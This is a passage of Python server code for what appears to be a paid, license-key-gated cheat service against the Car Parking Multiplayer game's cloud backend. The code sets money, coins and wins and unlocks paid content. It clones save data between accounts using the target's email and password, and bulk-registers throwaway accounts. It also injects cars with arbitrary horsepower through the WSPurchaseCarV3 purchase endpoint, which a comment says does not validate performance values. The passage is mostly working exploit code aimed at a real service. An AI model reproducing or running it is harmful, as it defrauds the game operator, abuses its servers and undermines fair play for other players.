                    try:
                        plate_brief.append([p.get('plateId'), p.get('frontCarId'), p.get('rearCarId'),
                                            len(p.get('vinyls') or [])])
                    except Exception:
                        pass
                return self._json(200, {'ok': True, 'fcar': len(fcar), 'boughtFsos': len(fsos),
                                        'fsosAll': fsos[:20],
                                        'genIDs': len(gen), 'genNonEmpty': len(gen_ne),
                                        'genNEIdx': gen_ne[:12], 'genVals': gen_vals[:6],
                                        'genTail': [str(x) for x in gen[-8:]],
                                        'stNonZero': len(st_nz), 'stNZIdx': st_nz[:12],
                                        'allDataLen': len(str(ad)), 'allDataHead': str(ad)[:60],
                                        'ints': len(ints), 'intsHead': ints[:20],
                                        'floats': len(flts),
                                        'plates': len(plates), 'plateBrief': plate_brief,
                                        'fcarSample': fcar[:8], 'fcarTail': fcar[-6:]})

            # ===== PATCH46：读取账号全部车辆（车名+编号+车库序号） =====
            if path == '/api/cars/list':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False,
                                            'message': '密钥验证失败：%s' % (info if isinstance(info, str) else '未知'),
                                            'needKey': True})
                if info.get('type') != 'admin':
                    with _KEY_LOCK:
                        _it = _KEYS['keys'].get(info.get('kh') or '')
                        _perms = list(_it.get('perms') or []) if _it else []
                    if 'set_car' not in _perms and 'unlock_all' not in _perms and 'clone' not in _perms:
                        return self._json(200, {'ok': False, 'message': '此功能未包含在你的密钥中（找站长升级）'})
                c = get_session(str(body.get('sid') or ''))
                if not c or not c.record:
                    return self._json(200, {'ok': False, 'message': '请先登录账号', 'needKey': False})
                _cars = _car_fetch_all(c)
                if _cars is None:
                    return self._json(200, {'ok': False, 'message': '读取车辆失败，请重试'})
                _out = []
                for _i, _car in enumerate(_cars):
                    try:
                        _cid = int(_car.get('CarID') or 0)
                    except Exception:
                        _cid = 0
                    if _cid <= 0:
                        continue
                    _tx = _car.get('texts')
                    _inst = ''
                    if isinstance(_tx, list) and len(_tx) >= 3:
                        _inst = str(_tx[2] or '')
                    elif isinstance(_tx, str):
                        _inst = ''
                    _fl = _car.get('floats')
                    _hp = _nm = _rpm = None
                    if isinstance(_fl, list) and len(_fl) >= 5:
                        # 猜测：索引1=马力 索引2=最大转速 索引3=牛米 索引4=扭矩转速
                        try:
                            _hp = _fl[1]
                            _rpm = _fl[2]
                            _nm = _fl[3]
                        except Exception:
                            pass
                    _out.append({
                        'idx': _i,
                        'carId': _cid,
                        'name': CARS_CN.get(_cid, '未知车型(%d)' % _cid),
                        'genId': _inst,
                        'police': bool(_car.get('police')),
                        'hasVinyl': (len((_car.get('Vynils') or {}).get('allVynils') or [])
                                     if isinstance(_car.get('Vynils'), dict) else 0),
                        'floatsLen': len(_fl) if isinstance(_fl, list) else 0,
                        'hp': _hp, 'nm': _nm, 'rpm': _rpm,
                        'engineID': _car.get('engineID'),
                        'torque': _car.get('torque'),
                        'mass': _car.get('mass'),
                    })
                return self._json(200, {'ok': True, 'cars': _out, 'total': len(_out)})

            # ===== PATCH46：读取单辆车的完整字段（用于详情展开） =====
            if path == '/api/cars/detail':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': '密钥验证失败', 'needKey': True})
                c = get_session(str(body.get('sid') or ''))
                if not c or not c.record:
                    return self._json(200, {'ok': False, 'message': '请先登录账号'})
                try:
                    _want = int(body.get('idx') if body.get('idx') is not None else body.get('carId') or 0)
                except Exception:
                    _want = 0
                _useIdx = (body.get('idx') is not None)
                _cars = _car_fetch_all(c)
                if _cars is None:
                    return self._json(200, {'ok': False, 'message': '读取车辆失败，请重试'})
                _target = None
                if _useIdx and 0 <= _want < len(_cars):
                    _target = _cars[_want]
                else:
                    for _car in _cars:
                        try:
                            if int(_car.get('CarID') or 0) == _want:
                                _target = _car
                                break
                        except Exception:
                            continue
                if _target is None:
                    return self._json(200, {'ok': False, 'message': '未找到该车辆'})
                _cid = int(_target.get('CarID') or 0)
                _fields = {}
                for _k in sorted(_target.keys()):
                    _v = _target.get(_k)
                    try:
                        _s = json.dumps(_v, ensure_ascii=False)
                    except Exception:
                        _s = str(_v)
                    if len(_s) > 600:
                        _s = _s[:600] + '…'
                    _fields[_k] = _s
                return self._json(200, {'ok': True, 'carId': _cid,
                                        'name': CARS_CN.get(_cid, '未知车型(%d)' % _cid),
                                        'fields': _fields,
                                        'floats': _target.get('floats') if isinstance(_target.get('floats'), list) else None,
                                        'keys': sorted(_target.keys())})

            # ===== PATCH47：改车辆马力/牛米（走 WSPurchaseCarV3 买入通道） =====
            if path == '/api/cars/setpower':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False, 'message': '密钥验证失败', 'needKey': True})
                if info.get('type') != 'admin':
                    with _KEY_LOCK:
                        _it = _KEYS['keys'].get(info.get('kh') or '')
                        _perms = list(_it.get('perms') or []) if _it else []
                    if 'set_car' not in _perms and 'unlock_all' not in _perms:
                        return self._json(200, {'ok': False, 'message': '此功能未包含在你的密钥中（找站长升级）'})
                c = get_session(str(body.get('sid') or ''))
                if not c or not c.record:
                    return self._json(200, {'ok': False, 'message': '请先登录账号'})
                try:
                    _cid = int(body.get('carId') or 0)
                except Exception:
                    _cid = 0
                if _cid <= 0:
                    return self._json(200, {'ok': False, 'message': '车型无效'})
                try:
                    _hp = float(body.get('hp') or 0)
                    _nm = float(body.get('nm') or 0)
                except Exception:
                    return self._json(200, {'ok': False, 'message': '马力/牛米必须是数字'})
                if _hp <= 0 or _nm <= 0:
                    return self._json(200, {'ok': False, 'message': '马力/牛米必须大于 0'})
                if _hp > 5000 or _nm > 10000:
                    return self._json(200, {'ok': False, 'message': '数值过大（马力上限 5000，牛米上限 10000）'})
                _res = _car_set_power(c, _cid, _hp, _nm)
                return self._json(200, _res)

            if path == '/api/clone':
                return self._json(200, {'ok': False, 'message': '该功能已下线'})
                okk, info = verify_access(body.get('access') or '')
                if not okk:
                    return self._json(200, {'ok': False,
                                            'message': '密钥验证失败：%s' % (info if isinstance(info, str) else '未知'),
                                            'needKey': True})
                if info.get('type') != 'admin':
                    with _KEY_LOCK:
                        _it = _KEYS['keys'].get(info.get('kh') or '')
                        _perms = list(_it.get('perms') or []) if _it else []
                    if 'clone' not in _perms:
                        return self._json(200, {'ok': False, 'message': '此功能未包含在你的密钥中（找站长升级）'})
                # 当前会话 = 源账号；body 里的邮箱密码 = 目标账号（接收方）
                src = get_session(str(body.get('sid') or ''))
                if not src or not src.record:
                    return self._json(200, {'ok': False, 'message': '请先登录【源账号】（要复制数据的账号）'})
                if not src.load():
                    return self._json(200, {'ok': False, 'message': '源账号存档刷新失败，请重试'})
                dst = Client()
                lr = dst.login(str(body.get('dst_email') or '').strip(), str(body.get('dst_password') or ''))
                if not lr.get('ok'):
                    return self._json(200, {'ok': False, 'message': '目标账号登录失败：' + str(lr.get('message') or '')})
                if not dst.load():
                    return self._json(200, {'ok': False, 'message': '目标账号存档读取失败，请稍后重试'})
                rec = json.loads(json.dumps(src.record, ensure_ascii=False))
                opts = body.get('options') or {}
                if not opts.get('clone_id'):
                    rec['localID'] = dst.record.get('localID') or rec.get('localID')
                if not opts.get('clone_name'):
                    rec['Name'] = dst.record.get('Name') or rec.get('Name')
                # 分段克隆（差分提交；每段独立，尽力而为）—— 细分版（带大小诊断）
                orig0 = json.loads(json.dumps(dst.original, ensure_ascii=False))
                SEGS = [
                    ('货币', ['money', 'coin', 'Name']),
                    ('车辆本体', ['fcar', 'boughtFsos']),
                    ('改装数据', ['allData']),
                    ('属性集合', ['floats']),
                    ('警灯警笛', ['boughtPoliceLights', 'boughtPoliceSirens']),
                    ('车牌涂装', ['platesData']),
                ]
                seg_rows = []
                ok_n = 0
                for seg_name, seg_fields in SEGS:
                    if seg_name == '车辆本体':
                        seg_fields = ['carIDnStatus', 'boughtFsos', 'fcar', 'integers']
                    okseg = False
                    try:
                        seg_size = len(json.dumps({f: rec.get(f) for f in seg_fields}, ensure_ascii=False))
                    except Exception:
                        seg_size = -1
                    try:
                        rr = dst._send(rec, orig0, seg_fields)
                        okseg = bool(rr.get('ok'))
                    except Exception:
                        okseg = False
                    if okseg:
                        ok_n += 1
                    seg_rows.append([seg_name, okseg, seg_size])
                if ok_n == 0:
                    return self._json(200, {'ok': False, 'message': '保存被拒（0/%d 段）——稍后重试或联系开发者' % len(SEGS)})
                return self._json(200, {'ok': True, 'dstName': dst.record.get('Name') or '',
                                        'dstId': dst.record.get('localID') or '',
                                        'segs': seg_rows, 'okCount': ok_n, 'total': len(SEGS)})

            return self._json(404, {'ok': False, 'message': 'unknown api'})
        except Exception as e:
            return self._json(200, {'ok': False, 'message': '服务端异常：%s' % e})

    def _do_action(self, c, action, p):
        # 小b：功能开关 + 已删除动作拦截
        if action == 'refresh':
            pass
        elif action in ('set_id', 'unlock_all', 'unlock_cars'):
            return {'ok': False, 'message': '该功能已下线'}
        elif not feature_on(action):
            return {'ok': False, 'message': '该功能未开放'}
        money_max = MONEY_MAX
        coin_max = COIN_MAX
        actions = {
            'set_money': lambda: c.set_money(int(p.get('value') or 0)),
            'set_coin': lambda: c.set_coin(int(p.get('value') or 0)),
            'set_name': lambda: c.set_name(str(p.get('value') or '')),
            'set_id': lambda: c.set_player_id(str(p.get('value') or '')),
            'set_wins': lambda: c.set_wins(int(p.get('value') or 0)),
            'set_loses': lambda: c.set_loses(int(p.get('value') or 0)),
            'unlock_w16': lambda: c.unlock_w16(),
            'unlock_horns': lambda: c.unlock_horns(),
            'unlock_fuel': lambda: c.unlimited_fuel(),
            'unlock_damage': lambda: c.disable_damage(),
            'unlock_smoke': lambda: c.unlock_smoke(),
            'unlock_cars': lambda: {'ok': True, 'message': '请使用新版「全部车辆一键注入」按钮（在「解锁功能」卡片里）'},
            'unlock_wheels': lambda: c.unlock_wheels(),
            'unlock_anims': lambda: c.unlock_animations(),
            'unlock_houses': lambda: c.unlock_houses(),
            'complete_levels': lambda: c.complete_levels(),
            'set_rank': lambda: c.set_rank(),
            'fix_account': lambda: c.fix_account(),
            'unlock_all': lambda: c.unlock_all(),
            'refresh': lambda: ({'ok': True} if c.load() else {'ok': False, 'message': '没读到数据'}),
        }
        fn = actions.get(action)
        if not fn:
            return {'ok': False, 'message': '未知操作: ' + action}
        res = fn()
        out = dict(res or {'ok': False})
        try:
            if c.record:
                out['overview'] = make_overview(c.record)
        except Exception:
            pass
        return out


def make_overview(rec):
    if not rec:
        return None
    fl = rec.get('floats') or []
    def fv(i):
        return fl[i] if len(fl) > i else 0
    levels = [x for x in (rec.get('LevelsDoneTime') or []) if x and float(x) > 0]
    try:
        _cids = rec.get('carIDnStatus') or {}
        _cgen = (_cids.get('carGeneratedIDs') or []) if isinstance(_cids, dict) else []
        _carn = len([x for x in _cgen if str(x)])
    except Exception:
        _carn = 0
    if _carn <= 0:
        _carn = len(rec.get('fcar') or [])
    return {
        'name': rec.get('Name') or '',
        'id': rec.get('localID') or '',
        'money': int(rec.get('money') or 0),
        'coin': int(rec.get('coin') or 0),
        'cars': _carn,
        'wins': fv(8),
        'loses': fv(9),
        'levels': len(levels),
        'friends': len(rec.get('FriendsID') or []),
        'w16': fv(32),
        'damage': fv(34),
        'fuel': fv(3),
    }


# ============================================================
# 克隆任务（异步 + 进度查询）
# ============================================================

_BATCH_JOBS = {}


def _batch_new_job():
    jid = secrets.token_hex(8)
    with _KEY_LOCK:
        _BATCH_JOBS[jid] = {'phase': '准备', 'message': '准备中…', 'done': 0, 'total': 0,
                            'finished': False, 'error': '', 'created': int(time.time()),
                            'results': []}
        if len(_BATCH_JOBS) > 20:
            olds = sorted(_BATCH_JOBS.items(), key=lambda kv: kv[1].get('created') or 0)
            for k, _ in olds[:-10]:
                _BATCH_JOBS.pop(k, None)
    return jid


def _batch_update(jid, **kw):
    with _KEY_LOCK:
        j = _BATCH_JOBS.get(jid)
        if j:
            j.update(kw)


def _batch_run(jid, src_sid, count, prefix, domain, opts, fixed_email=None, fixed_password=None, batch_password=None):
    try:
        import random as _rnd
        src = get_session(src_sid)
        if not src or not src.record:
            _batch_update(jid, finished=True, error='源会话已失效，请重新登录后再试')
            return
        _batch_update(jid, total=count, message='开始批量：共 %d 个新账号' % count)
        for i in range(1, count + 1):
            _batch_update(jid, message='[%d/%d] 注册新账号…' % (i, count))
            tag = ''.join(_rnd.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(6))
            email = '%s%d%s@%s' % (prefix, i, tag, domain)
            password = 'CPM' + ''.join(_rnd.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(10))
            if fixed_email and i == 1:
                email = fixed_email
            if fixed_password and i == 1:
                password = fixed_password
            if batch_password:
                password = batch_password
            rr = register_account(email, password)
            item = {'email': email, 'password': password, 'ok': False, 'message': '', 'cars': 0}
            if not rr.get('ok'):
                item['message'] = '注册失败：' + str(rr.get('message') or '')[:60]
                with _KEY_LOCK:
                    _j = _BATCH_JOBS.get(jid)
                    if _j:
                        _j['results'] = (_j.get('results') or []) + [item]
                        _j['done'] = i
                continue
            _login_check2 = ''
            try:
                _chk = Client()
                _lr = _chk.login(email, password)
                if _lr.get('ok'):
                    _login_check2 = '可登录' if _chk.load() else '登录OK/空档'
                else:
                    _login_check2 = '登录失败:' + str(_lr.get('message') or '')[:30]
            except Exception:
                _login_check2 = '自检异常'
            item['login_test'] = _login_check2
            _batch_update(jid, message='[%d/%d] 注册成功（%s），开始克隆…' % (i, count, _login_check2))
            _batch_update(jid, message='[%d/%d] 注册成功，开始克隆…' % (i, count))
            _sub = _clone_new_job()
            threading.Thread(target=_clone_run, args=(_sub, src_sid, email, password, opts), daemon=True).start()
            _t0 = time.time()
            while time.time() - _t0 < 900:
                with _KEY_LOCK:
                    _sj = dict(_CLONE_JOBS.get(_sub) or {})
                if _sj.get('finished'):
                    break
                time.sleep(2)
            with _KEY_LOCK:
                _sj = dict(_CLONE_JOBS.get(_sub) or {})
            _ok = bool(_sj.get('result')) and not _sj.get('error')
            try:
                _cars = int(_sj.get('vehicles') or 0)
            except Exception:
                _cars = 0
            item['ok'] = _ok
            item['cars'] = _cars
            item['message'] = str(_sj.get('error') or _sj.get('message') or '')[:60]
            with _KEY_LOCK:
                _j = _BATCH_JOBS.get(jid)
                if _j:
                    _j['results'] = (_j.get('results') or []) + [item]
                    _j['done'] = i
        _batch_update(jid, finished=True, message='批量完成')
    except Exception as e:
        _batch_update(jid, finished=True, error=str(e)[:150])


# ===== 全车解锁（模板注入版）=====
CAR_TPL_B64 = 'eyJDYXJJRCI6cmVwbGFjZWNhciwiZGF0YVZlcnNpb24iOjIsInZlY3RvcnMiOlt7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9LHsieCI6Mi4wLCJ5IjoyLjAsInoiOjIuMH0seyJ4IjoyLjAsInkiOjIuMCwieiI6Mi4wfSx7IngiOjIuMCwieSI6Mi4wLCJ6IjoyLjB9XSwiZmxvYXRzIjpbMC4wLDgxNi4wLDU1MDAuMCwyNjAuMCwxNDAwLjAsMC4wLDAuMCwxLjAsMS4wLDY4LjAsMC4yMiwwLjIyLDQwMDAwLjAsNDAwMDAuMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDAuMCwzMy4wLDAuMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDIuMCwyLjAsMC41LDAuMCwwLjAsMC4wLDEuMCwxLjAsMS4wLDEuMCwxNTAwLjAsMS4wLDAuMCwwLjAsNjguMCwwLjAsMC4wLDAuMCwwLjAsMC4wLDAuMF0sImdlYXJzIjpbMy4yLDEuOTEsMS41MywxLjI3LDAuOSwwLjYsMC40NSw1LjBdLCJ0eXBlVG9JbnN0YWxsIjpbLTIsLTIsLTIsLTIsLTIsLTIsLTIsLTJdLCJCb3VnaHRQYXJ0cyI6WzAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMCwwLDAsMF0sInRleHRzIjpbIiIsIiIsInJlcGxhY2VpZF9yZXBsYWNlY2FySlgzMzUiLCIiXSwiZmxhZ0lEIjotMSwiZnNvRGF0YSI6Wy0xLDAsMjU1LDI1NSwyNTUsMjU1LDI1NSwyNTVdLCJpbnN0YWxsZWRQb2xpY2VMaWdodHMiOlstMSwtMSwtMSwtMSwtMV0sIlZ5bmlscyI6eyJhbGxWeW5pbHMiOltdLCJDYXJJRCI6cmVwbGFjZWNhcn19'
_CUNLOCK_JOBS = {}


def _cunlock_new_job():
    jid = 'cu' + secrets.token_hex(4)
    with _KEY_LOCK:
        _CUNLOCK_JOBS[jid] = {'done': 0, 'total': 0, 'ok': 0, 'fail': 0, 'skipped': 0,
                              'current': 0, 'finished': False, 'error': '', 'message': '', 'result': {}}
    return jid


def _cunlock_update(jid, **kw):
    with _KEY_LOCK:
        j = _CUNLOCK_JOBS.get(jid)
        if j is None:
            j = {}
            _CUNLOCK_JOBS[jid] = j
        j.update(kw)


def _car_fetch_slots(c, page=20):
    """拉一批市场槽（列表）。失败返回 []。"""
    _ws = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSGetCarListV3'
    _hdr = {'Authorization': 'Bearer ' + (c.token or '')}
    try:
        _sr = http_post(_ws, {'data': page}, headers=_hdr, timeout=25)
        _sv = _sr.get('result') if isinstance(_sr, dict) else None
        for _u in range(2):
            if isinstance(_sv, str):
                try:
                    _sv = json.loads(_sv)
                except Exception:
                    break
        if isinstance(_sv, list):
            return [x for x in _sv if isinstance(x, dict)]
    except Exception:
        pass
    return []


def _car_make_one(c, cid, lids):
    """构造模板车 JSON。"""
    try:
        raw = base64.b64decode(CAR_TPL_B64).decode('utf-8')
        car = json.loads(raw.replace('replacecar', str(cid)).replace('replaceid', lids))
    except Exception:
        return None
    car['engineID'] = 5
    car['cdi'] = True
    car['isLocked'] = False
    car['torque'] = 3000.0
    car['brake'] = 3000.0
    car['mass'] = 1100.0
    return car


def _car_buy_slot(c, car, slot, cid):
    """用指定槽把 car（车型 cid）买进来。返回 (ok, note)。"""
    _wp = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3'
    _hdr = {'Authorization': 'Bearer ' + (c.token or '')}
    _pay = {
        'ownerID': slot.get('ownerID', ''),
        'ownerName': slot.get('ownerName', ''),
        'description': slot.get('description', ''),
        'CarID': slot.get('carID', 0),
        'carGeneratedID': slot.get('carGeneratedID', ''),
        'ownerAccountID': slot.get('ownerAccountID', ''),
        'oneCar': car,
        'vynilOneCar': car.get('Vynils', {}),
        'loadedLocalCar': {'instanceID': -100000 - cid},
        'price': slot.get('price', 100),
        'SellingCar': {},
        'willReject': False,
        'dislike': 1,
        'like': 0,
        'liked': False,
        'disliked': False,
        'mode': 1,
    }
    try:
        _pr = http_post(_wp, {'data': json.dumps(_pay, ensure_ascii=False)}, headers=_hdr, timeout=40)
        _prv = _pr.get('result') if isinstance(_pr, dict) else None
        if str(_prv) == '1':
            return (True, '')
        return (False, '服务器结果 %s' % str(_prv)[:20])
    except Exception as e:
        return (False, '请求异常 %s' % str(e)[:40])


def _car_have_set(c, timeout=30):
    """拉一次 GetAllCars2，返回已有 CarID 集合。"""
    try:
        _r = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2',
                       {'data': None}, headers={'Authorization': 'Bearer ' + (c.token or '')}, timeout=timeout)
        _v = _r.get('result') if isinstance(_r, dict) else None
        for _u in range(2):
            if isinstance(_v, str):
                try:
                    _v = json.loads(_v)
                except Exception:
                    break
        if isinstance(_v, list):
            return set(int(x.get('CarID') or 0) for x in _v if isinstance(x, dict) and int(x.get('CarID') or 0) > 0)
    except Exception:
        pass
    return None


# ============================================================
# 造车引擎（v2）：以"目标号现有车"为模板，改写 CarID + genID，
# 字段转 byte 数组后走 WSPurchaseCarV3 注入。
# ============================================================

def _car_fetch_all(c, timeout=30):
    """拉取本号全部车的【完整记录】。
    PATCH41：必须用 TestGetAllCars —— GetAllCars2 只给「车库列表条目」，
    它的 Vynils/texts 是密文；用那种数据当模板注入出来的车没有涂装。
    返回的每辆车带明文 Vynils（dict）与明文 texts（list）。"""
    # 先试完整体
    try:
        _r = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/TestGetAllCars',
                       {'data': None}, headers={'Authorization': 'Bearer ' + (c.token or '')},
                       timeout=max(timeout, 90))
        _v = _r.get('result') if isinstance(_r, dict) else None
        for _u in range(3):
            if isinstance(_v, str):
                try:
                    _v = json.loads(_v)
                except Exception:
                    break
        if isinstance(_v, list):
            _out = [x for x in _v if isinstance(x, dict) and int(x.get('CarID') or 0) > 0]
            if _out:
                return _out
    except Exception:
        pass
    # 兜底：车库列表
    try:
        _r = http_post('https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2',
                       {'data': None}, headers={'Authorization': 'Bearer ' + (c.token or '')}, timeout=timeout)
        _v = _r.get('result') if isinstance(_r, dict) else None
        for _u in range(2):
            if isinstance(_v, str):
                try:
                    _v = json.loads(_v)
                except Exception:
                    break
        if isinstance(_v, list):
            return [x for x in _v if isinstance(x, dict) and int(x.get('CarID') or 0) > 0]
    except Exception:
        pass
    return None


def _car_pick_template(cars):
    """选一辆"字段为加密字符串/数组"的车当模板（优先字段最全的）。"""
    if not cars:
        return None
    # 优先：字段为 base64 字符串的（游戏原生格式）
    best = None
    best_score = -1
    for car in cars:
        s = 0
        for k in ('BoughtParts', 'typeToInstall', 'texts', 'vectors', 'floats', 'gears', 'fsoData'):
            v = car.get(k)
            if isinstance(v, str) and len(v) > 8:
                s += 2
            elif isinstance(v, list) and v:
                s += 1
        if s > best_score:
            best_score = s
            best = car
    return best


def _gid_patch(b64s, lids, target):
    """改写 texts 里的 genID：把形如 {任意前缀}_{编号}{车牌} 的实例名，
    换成 {lids}_{target}{车牌}（等长填充）。"""
    try:
        raw = bytearray(base64.b64decode(b64s))
    except Exception:
        return b64s
    # 找 genID 起点：优先目标前缀，其次源前缀，再退化为任意"字母数字_数字"
    lb = str(lids or '').encode('ascii', 'ignore')
    idx = -1
    if lb:
        idx = bytes(raw).find(lb)
    if idx < 0:
        # 通用匹配：AA000000_13BB573 这种
        try:
            m = re.search(rb'[A-Za-z0-9]{4,12}_\d+[A-Za-z0-9]*', bytes(raw))
            if m:
                idx = m.start()
                raw[idx:idx + (m.end() - m.start())] = _mk_gid(lids, target, m.end() - m.start())
                # 通用匹配已经替换完，但如果长度不足需填充
                return base64.b64encode(bytes(raw)).decode('ascii')
        except Exception:
            pass
        return b64s
    j = idx
    while j < len(raw) and (48 <= raw[j] <= 57 or 65 <= raw[j] <= 90 or 97 <= raw[j] <= 122 or raw[j] == 95):
        j += 1
    old = bytes(raw)[idx:j]
    nb = _mk_gid(lids, target, len(old))
    raw[idx:idx + len(old)] = nb
    return base64.b64encode(bytes(raw)).decode('ascii')


def _mk_gid(lids, target, length):
    """生成 genID 字节串（长度 = length）"""
    plate = ''.join(random.choice(string.ascii_uppercase) for _ in range(2)) + str(random.randint(100, 999))
    newgid = '%s_%d%s' % (lids, target, plate)
    nb = newgid.encode('ascii', 'ignore')[:length]
    if len(nb) < length:
        nb = nb + b'0' * (length - len(nb))
    return nb


def _b64_to_bytes(s):
    """base64 字符串 -> byte 数组（list[int]）。失败返回 None。"""
    try:
        return list(base64.b64decode(s, validate=True))
    except Exception:
        try:
            return list(base64.b64decode(s))
        except Exception:
            return None


def _fix_field(v):
    """把字段值规范成服务器要的格式：
    - base64 字符串 -> byte 数组
    - 数组 -> 原样（数字数组不动；字符串数组保持）
    - 其它 -> 原样"""
    if isinstance(v, str) and len(v) > 8:
        arr = _b64_to_bytes(v)
        return arr if arr is not None else v
    return v


def make_car_via_template(c, tpl, lids, target, slot):
    """用模板车造 CarID=target 的车。返回 (ok, note)。"""
    _wp = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/WSPurchaseCarV3'
    mod = json.loads(json.dumps(tpl, ensure_ascii=False))
    mod['CarID'] = target
    # PATCH38：不要再用 _fix_field 把 base64 字符串转成 byte 数组！
    # 服务器要的是【base64 字符串原样】，转成数组后外观字段（Vynils/
    # WindowVinyls/BoughtParts/typeToInstall…）会被静默丢弃。
    for k in list(mod.keys()):
        v = mod.get(k)
        if isinstance(v, str) and len(v) > 8 and k == 'texts':
            mod[k] = _gid_patch(v, lids, target)
    _pay = {
        'ownerID': slot.get('ownerID', ''),
        'ownerName': slot.get('ownerName', ''),
        'description': slot.get('description', ''),
        'CarID': slot.get('carID', 0),
        'carGeneratedID': slot.get('carGeneratedID', ''),
        'ownerAccountID': slot.get('ownerAccountID', ''),
        'oneCar': mod,
        'vynilOneCar': mod.get('Vynils', {}),
        'loadedLocalCar': {'instanceID': -100000 - target},
        'price': slot.get('price', 100),
        'SellingCar': {},
        'willReject': False,
        'dislike': 1,
        'like': 0,
        'liked': False,
        'disliked': False,
        'mode': 1,
    }
    _hdr = {'Authorization': 'Bearer ' + (c.token or '')}
    try:
        _pr = http_post(_wp, {'data': json.dumps(_pay, ensure_ascii=False)}, headers=_hdr, timeout=40)
        _prv = _pr.get('result') if isinstance(_pr, dict) else None
        if str(_prv) in ('1', '2', '6', '14'):
            return (True, '')
        return (False, '结果 %s' % str(_prv)[:20])
    except Exception as e:
        return (False, '异常 %s' % str(e)[:40])


def _car_set_power(c, cid, hp, nm):
    """PATCH47：改某车型的马力/牛米。
    原理（实测有效）：服务器对"买入新车"不校验性能参数，
    用该车型造一台新车、floats 设为目标值，走 WSPurchaseCarV3 买入，
    新车 genID 用自己号前缀 → 归属正确、服务器照单全收。
    优先用账号里同车型的现有车做模板（保留涂装/外观），没有就用内置模板。"""
    _base = 'https://europe-west1-cp-multiplayer.cloudfunctions.net/'
    _hdr = {'Authorization': 'Bearer ' + (c.token or '')}
    _u8 = (c.uid or '')[:8].upper()

    def _plist(v):
        r = []
        for _ in range(2):
            if isinstance(v, str):
                try:
                    v = json.loads(v)
                except Exception:
                    break
            else:
                break
        return v if isinstance(v, list) else []

    # 1) 找一个可用的市场槽（优先 carID 匹配，其次空槽）
    _slots = []
    try:
        _sr = http_post(_base + 'WSGetCarListV3', {'data': 20}, headers=_hdr, timeout=25)
        _slots = _plist(_sr.get('result') if isinstance(_sr, dict) else None)
    except Exception:
        _slots = []
    if not _slots:
        return {'ok': False, 'message': '市场暂时没有可用的车位置，稍后再试'}
    _slot = None
    for _s in _slots:
        if isinstance(_s, dict) and int(_s.get('carID') or 0) == cid:
            _slot = _s
            break
    if _slot is None:
        for _s in _slots:
            if isinstance(_s, dict) and int(_s.get('carID') or 0) == 0:
                _slot = _s
                break
    if _slot is None:
        _slot = _slots[0]
    if not isinstance(_slot, dict):
        return {'ok': False, 'message': '没有可用车位置'}

    # 2) 取模板：优先账号里同车型的车（保留涂装外观），否则用内置模板
    _tpl = None
    try:
        _cars = _car_fetch_all(c, timeout=45) or []
        for _c in _cars:
            if int(_c.get('CarID') or 0) == cid:
                _tpl = _c
                break
    except Exception:
        _tpl = None
    if _tpl is not None:
        _car = json.loads(json.dumps(_tpl, ensure_ascii=False))
    else:
        try:
            _raw = base64.b64decode(CAR_TPL_B64).decode('utf-8')
            _car = json.loads(_raw.replace('replacecar', str(cid)).replace('replaceid', _u8))
        except Exception:
            return {'ok': False, 'message': '模板构造失败'}

    # 3) 写入目标马力/牛米
    _fl = _car.get('floats')
    if not isinstance(_fl, list) or len(_fl) < 5:
        _fl = [0.0] * 54
    while len(_fl) < 5:
        _fl.append(0.0)
    _fl = list(_fl)
    _fl[0] = 0.0
    _fl[1] = float(hp)          # 马力
    if not _fl[2]:
        _fl[2] = 5500.0         # 最大转速
    _fl[3] = float(nm)          # 牛米
    if not _fl[4]:
